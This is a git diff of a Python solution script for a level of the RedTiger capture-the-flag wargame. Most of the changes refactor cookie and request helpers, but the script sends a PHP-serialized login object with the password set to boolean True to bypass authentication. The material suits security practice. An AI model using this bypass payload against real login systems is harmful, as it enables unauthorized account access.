@@ -3,6 +3,8 @@ import pickle
 import tigers as tg
 import base64
 from phpserialize import serialize
+import tiger_cookies
+from connect import my_request as req
 
 
 def main():
@@ -12,18 +14,10 @@ def main():
     url = "https://redtiger.labs.overthewire.org/level10.php"
     pass_r = 'The password for the hall of fame is: '
     user = 'TheMaster'
+    level = 'level10login'
 
-    try:
-        with open('cooks.pickle', 'rb') as f:
-            cooks = pickle.load(f)
-        if 'level10login' not in cooks:
-            print('use prevision level')
-            exit(1)
-    except:
-        print('use level 1')
-        exit(1)
-
-    cook = dict(level10login=cooks['level10login'])
+    cooks = tiger_cookies.check_cookies(level)
+    cook = dict(level10login=cooks[level])
 
     array = serialize(
         {'username': 'TheMaster', 'password': True, })
@@ -32,7 +26,7 @@ def main():
 
     # Authorization
     data = dict(login=ser, dologin='Login')
-    response = tg.get_request(url, data, cook, method='post')
+    response = req.post_request(url, data, cook)
 
     print(response)
 
